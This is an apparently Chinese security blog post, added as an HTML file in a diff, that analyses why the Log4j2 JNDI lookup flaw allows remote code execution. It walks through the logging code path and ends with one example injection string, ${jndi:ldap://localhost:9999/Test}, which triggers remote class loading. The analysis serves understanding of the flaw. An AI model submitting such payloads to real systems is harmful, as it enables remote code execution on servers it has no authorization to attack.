@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ashin9.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="并不复杂？甚至认真读了官方文档就可以发现漏洞？原理就是 log4j2 提供的正常功能？ 对于$&amp;#123;jndi:&amp;#125;格式的日志默认执行JndiLoop.lookup导致的RCE。日志的任何一部分插入$&amp;#123;&amp;#125;都会进行递归处理，也就是说log.info&#x2F;error&#x2F;warn等方法，如果日志内容可控 1 输入可控：相信了用户的输入 —&gt; 进入到 log.xx(输入)方">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2漏洞原因分析">
+<meta property="og:url" content="https://ashin9.github.io/2023/07/16/Log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Ashing&#39;s Blog">
+<meta property="og:description" content="并不复杂？甚至认真读了官方文档就可以发现漏洞？原理就是 log4j2 提供的正常功能？ 对于$&amp;#123;jndi:&amp;#125;格式的日志默认执行JndiLoop.lookup导致的RCE。日志的任何一部分插入$&amp;#123;&amp;#125;都会进行递归处理，也就是说log.info&#x2F;error&#x2F;warn等方法，如果日志内容可控 1 输入可控：相信了用户的输入 —&gt; 进入到 log.xx(输入)方">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-07-16T01:23:50.000Z">
+<meta property="article:modified_time" content="2023-07-16T01:32:34.884Z">
+<meta property="article:author" content="Ashing">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://ashin9.github.io/2023/07/16/Log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Log4j2漏洞原因分析 | Ashing's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ashing's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">想学的太多 懂得的太少</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ashin9.github.io/2023/07/16/Log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/dxx.jpg">
+      <meta itemprop="name" content="Ashing">
+      <meta itemprop="description" content="Cyber Security">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ashing's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Log4j2漏洞原因分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-16 09:23:50 / 修改时间：09:32:34" itemprop="dateCreated datePublished" datetime="2023-07-16T09:23:50+08:00">2023-07-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>并不复杂？甚至认真读了官方文档就可以发现漏洞？原理就是 log4j2 提供的正常功能？</p>
+<p>对于<code>$&#123;jndi:&#125;</code>格式的日志默认执行<code>JndiLoop.lookup</code>导致的RCE。日志的任何一部分插入<code>$&#123;&#125;</code>都会进行递归处理，也就是说<code>log.info/error/warn</code>等方法，如果日志内容可控</p>
+<h3 id="1-输入可控：相信了用户的输入-—-gt-进入到-log-xx-输入-方法"><a href="#1-输入可控：相信了用户的输入-—-gt-进入到-log-xx-输入-方法" class="headerlink" title="1 输入可控：相信了用户的输入 —&gt; 进入到 log.xx(输入)方法"></a>1 输入可控：相信了用户的输入 —&gt; 进入到 log.xx(输入)方法</h3><p>比如：登录用户名是可控输入，后台一般用日志处理相关的输入信息，如：<code>log.error(&quot;xxx, &#123;&#125;&quot;,username)</code>，可控输入能够进入 Log4j2 处理程序</p>
+<h3 id="2-触发条件：logIfEnabled-—-gt-进入到logMessage-输入-的方法中"><a href="#2-触发条件：logIfEnabled-—-gt-进入到logMessage-输入-的方法中" class="headerlink" title="2 触发条件：logIfEnabled() —&gt; 进入到logMessage(输入)的方法中"></a>2 触发条件：logIfEnabled() —&gt; 进入到logMessage(输入)的方法中</h3><p>当日志级别（调用）大于等于（intLevel 值 &lt;&#x3D; ）系统设置的<code>intLevel</code>（默认 200）的时候，log4j2才会启用日志打印</p>
+<p>调用级别越大值越小。默认调用级别（intLevel 值）：error（200）。默认时使用 OFF、log.fatal()、log.error() 才可触发记录日志</p>
+<h3 id="3-log4j2-匹配-—-gt-递归解析-—-gt-内容进入-lookup-查询"><a href="#3-log4j2-匹配-—-gt-递归解析-—-gt-内容进入-lookup-查询" class="headerlink" title="3 log4j2 匹配 —&gt; 递归解析${} —&gt; 内容进入 lookup() 查询"></a>3 log4j2 匹配 —&gt; 递归解析${} —&gt; 内容进入 lookup() 查询</h3><h4 id="MessagePatternConverter-format-匹配-内容，一旦匹配则触发替换机制"><a href="#MessagePatternConverter-format-匹配-内容，一旦匹配则触发替换机制" class="headerlink" title="MessagePatternConverter.format() 匹配 ${} 内容，一旦匹配则触发替换机制"></a>MessagePatternConverter.format() 匹配 ${} 内容，一旦匹配则触发替换机制</h4><p><code>org.apache.logging.log4j.core.pattern.MessagePatternConverter的format()</code>方法中，判断<code>noLookups</code>这个变量的值，<code>noLookups</code>默认为<code>false</code>（意思为开启JNDI格式化功能）</p>
+<h4 id="getStrSubstitutor-replace-event-value-：提取传入-looup-的参数"><a href="#getStrSubstitutor-replace-event-value-：提取传入-looup-的参数" class="headerlink" title="getStrSubstitutor().replace(event, value)：提取传入 looup() 的参数"></a>getStrSubstitutor().replace(event, value)：提取传入 looup() 的参数</h4><p>log的<code>message event</code>进行处理，取出<code>$&#123;&#125;</code>中的数据进行后续<code>lookup()</code>操作</p>
+<p>递归解析，若${}嵌套则会由内向外多次解析</p>
+<h4 id="Interpolator-lookup-：lookup-查询-jndi"><a href="#Interpolator-lookup-：lookup-查询-jndi" class="headerlink" title="Interpolator.lookup()：lookup() 查询 jndi"></a>Interpolator.lookup()：lookup() 查询 jndi</h4><p><code>org.apache.logging.log4j.core.lookup.Interpolator</code>的<code>lookup()</code>方法包含多种处理<code>event</code>的途径，根据<code>event</code>的<code>prefix</code>选择相应的<code>StrLookup</code>进行处理。包括<code>jndi、date、Java、main</code>等</p>
+<blockquote>
+<p>详细 event -&gt; prefix：log4j2 中文文档：<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html">https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html</a></p>
+</blockquote>
+<p>当构造的<code>event</code>的<code>prefix</code>为<code>jndi</code>时，则通过<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup()</code>方法处理，从而触发JNDI漏洞利用。</p>
+<p>参数 <code>jndiName</code> 是用户可控的${中的值}，也就是在 log 中的记录</p>
+<h3 id="4-JNDI-注入远程加载类，类似于远程文件包含，可加载自己-vps-上的恶意代码达到-RCE"><a href="#4-JNDI-注入远程加载类，类似于远程文件包含，可加载自己-vps-上的恶意代码达到-RCE" class="headerlink" title="4 JNDI 注入远程加载类，类似于远程文件包含，可加载自己 vps 上的恶意代码达到 RCE"></a>4 JNDI 注入远程加载类，类似于远程文件包含，可加载自己 vps 上的恶意代码达到 RCE</h3><p>使用 <code>jndi:</code> 关键字来触发 JNDI 注入漏洞，对于 <code>jndi:</code> 关键字的处理类为 <code>org.apache.logging.log4j.core.lookup.JndiLookup</code> </p>
+<p>默认支持解析 jndi&#x2F;rmi 协议，并会通过名称从 ldap 服务端其获取对应的 Class 文件，并使用 ClassLoader 在本地加载 Ldap 服务端返回的 Class 类</p>
+<p>这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的 ldap 协议内容（如：恶意内容<code>$&#123;jndi:ldap://localhost:9999/Test&#125;</code>恶意内容），该内容传递到后端被 log4j2 打印出来，就会触发恶意的 Class 的加载执行（可执行任意后台指令），从而达到攻击的目的。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/11/18/Docker%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/" rel="prev" title="Docker命令总结">
+      <i class="fa fa-chevron-left"></i> Docker命令总结
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BE%93%E5%85%A5%E5%8F%AF%E6%8E%A7%EF%BC%9A%E7%9B%B8%E4%BF%A1%E4%BA%86%E7%94%A8%E6%88%B7%E7%9A%84%E8%BE%93%E5%85%A5-%E2%80%94-gt-%E8%BF%9B%E5%85%A5%E5%88%B0-log-xx-%E8%BE%93%E5%85%A5-%E6%96%B9%E6%B3%95"><span class="nav-number">1.</span> <span class="nav-text">1 输入可控：相信了用户的输入 —&gt; 进入到 log.xx(输入)方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6%EF%BC%9AlogIfEnabled-%E2%80%94-gt-%E8%BF%9B%E5%85%A5%E5%88%B0logMessage-%E8%BE%93%E5%85%A5-%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%AD"><span class="nav-number">2.</span> <span class="nav-text">2 触发条件：logIfEnabled() —&gt; 进入到logMessage(输入)的方法中</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-log4j2-%E5%8C%B9%E9%85%8D-%E2%80%94-gt-%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90-%E2%80%94-gt-%E5%86%85%E5%AE%B9%E8%BF%9B%E5%85%A5-lookup-%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.</span> <span class="nav-text">3 log4j2 匹配 —&gt; 递归解析${} —&gt; 内容进入 lookup() 查询</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MessagePatternConverter-format-%E5%8C%B9%E9%85%8D-%E5%86%85%E5%AE%B9%EF%BC%8C%E4%B8%80%E6%97%A6%E5%8C%B9%E9%85%8D%E5%88%99%E8%A7%A6%E5%8F%91%E6%9B%BF%E6%8D%A2%E6%9C%BA%E5%88%B6"><span class="nav-number">3.1.</span> <span class="nav-text">MessagePatternConverter.format() 匹配 ${} 内容，一旦匹配则触发替换机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getStrSubstitutor-replace-event-value-%EF%BC%9A%E6%8F%90%E5%8F%96%E4%BC%A0%E5%85%A5-looup-%E7%9A%84%E5%8F%82%E6%95%B0"><span class="nav-number">3.2.</span> <span class="nav-text">getStrSubstitutor().replace(event, value)：提取传入 looup() 的参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Interpolator-lookup-%EF%BC%9Alookup-%E6%9F%A5%E8%AF%A2-jndi"><span class="nav-number">3.3.</span> <span class="nav-text">Interpolator.lookup()：lookup() 查询 jndi</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-JNDI-%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E7%B1%BB%EF%BC%8C%E7%B1%BB%E4%BC%BC%E4%BA%8E%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E5%8F%AF%E5%8A%A0%E8%BD%BD%E8%87%AA%E5%B7%B1-vps-%E4%B8%8A%E7%9A%84%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%BE%BE%E5%88%B0-RCE"><span class="nav-number">4.</span> <span class="nav-text">4 JNDI 注入远程加载类，类似于远程文件包含，可加载自己 vps 上的恶意代码达到 RCE</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ashing"
+      src="/images/dxx.jpg">
+  <p class="site-author-name" itemprop="name">Ashing</p>
+  <div class="site-description" itemprop="description">Cyber Security</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ashin9" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ashin9" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ashin9@foxmail.com" title="E-Mail → mailto:ashin9@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://ttonys.github.io/" title="https:&#x2F;&#x2F;ttonys.github.io&#x2F;" rel="noopener" target="_blank">tongs</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://j0k3r.top/" title="http:&#x2F;&#x2F;j0k3r.top&#x2F;" rel="noopener" target="_blank">joker</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://daolgts.github.io/" title="https:&#x2F;&#x2F;daolgts.github.io" rel="noopener" target="_blank">daolgts</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wzt.ac.cn/" title="https:&#x2F;&#x2F;wzt.ac.cn&#x2F;" rel="noopener" target="_blank">CataLpa</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://asa9ao.xyz/" title="http:&#x2F;&#x2F;asa9ao.xyz&#x2F;" rel="noopener" target="_blank">Asa9ao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://v0w.top/" title="https:&#x2F;&#x2F;v0w.top" rel="noopener" target="_blank">vOw</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ashing</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
